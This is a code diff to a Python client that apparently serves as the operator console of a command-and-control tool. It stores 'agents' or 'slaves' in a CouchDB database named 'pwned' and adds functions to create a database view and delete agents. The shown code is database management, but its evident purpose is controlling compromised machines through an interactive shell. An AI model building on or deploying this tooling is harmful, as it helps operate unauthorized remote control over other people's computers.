@@ -7,6 +7,7 @@ from PyInquirer import style_from_dict, Token, prompt, Separator
 from examples import custom_style_2,custom_style_1,custom_style_3
 import sys
 from shell import Shell
+import requests
 
 class Client(object):
 
@@ -65,10 +66,22 @@ class Client(object):
 			print(Fore.GREEN + "*** Successfully Created pwnd DB... ***")
 			print(Style.RESET_ALL)
 			self.db = self.couchserver['pwned']
+			print(Fore.YELLOW + "Attempting to create view")
+			print(Style.RESET_ALL)
+			view = self.create_view(answers['username'],answers['password'],answers['ip'],answers['port'])
+			if view:
+				print(Fore.GREEN + "Created View")
+				print(Style.RESET_ALL)
+			else:
+				print(Fore.RED + "Failed to create View")
+				print(Style.RESET_ALL)
+
 		else:
 			print(Fore.GREEN + "*** Success pwned DB Found ***")
 			print(Style.RESET_ALL)
 			self.db = self.couchserver['pwned']
+
+
 
 
 
@@ -91,11 +104,14 @@ class Client(object):
 	    answers = prompt(questions, style=custom_style_3)
 	    return answers
 
-	def create_view(self):
-		## TO DO CREATE VIEW AUTOMATICALLY IF DOESNT EXIST
-		#curl -X PUT http://admin:admin@127.0.0.1:5984/pwned/_design/list_agents --data-binary @doc_view.js
-		#curl http://admin:admin@127.0.0.1:5984/pwned/_design/list_agents/_view/agent
-		print("create view if doesnt exist")
+	def create_view(self,username,password,ip,port):
+		try:
+			data = open('doc_view.js','rb').read()
+			resp = requests.put("http://{}:{}@{}:{}/pwned/_design/list_agents".format(username,password,ip,port),data=data)
+			return True
+		except:
+			print("Error Creating View")
+			return False
 
 
 
@@ -142,7 +158,6 @@ class Client(object):
 	def cmd_slave(self):
 		if self.list_slaves():		
 			print(self.agent_list)
-			print(type(self.agent_list))
 			questions = [{'type':'list','name':'agent_listing','message':'choose agent','choices':self.agent_list}]	
 			answers = prompt(questions,style=custom_style_3)
 			print(answers)
@@ -155,23 +170,29 @@ class Client(object):
 
 	def controlling_agent(self,agent_id):
 		print(agent_id)
-		shell = Shell()
+		shell = Shell() ### check shell.py
 		shell.agent_id = agent_id
 		shell.db_connection = self.db
 		shell.cmdloop()
 
 
 
-
-
-
-
-
-
-
-
 	def del_agent(self):
-		print("delete one agent")
+		if self.list_slaves():
+			print(self.agent_list)
+			questions = [{'type':'list','name':'agent_listing','message':'Choose Agent To Delete','choices':self.agent_list}]
+			answers = prompt(questions,style=custom_style_3)
+			doc = self.db[answers['agent_listing']]
+			self.db.delete(doc)
+			print(Fore.GREEN + "*** Successfully Deleted Agent ***")
+			print(Style.RESET_ALL)
+			return True
+		else:
+			print(Fore.YELLOW + "*** No Agents Available ***")
+			print(Style.RESET_ALL)
+			return False
+
+
 
 	def dump_db(self):
 		print("deleting database")
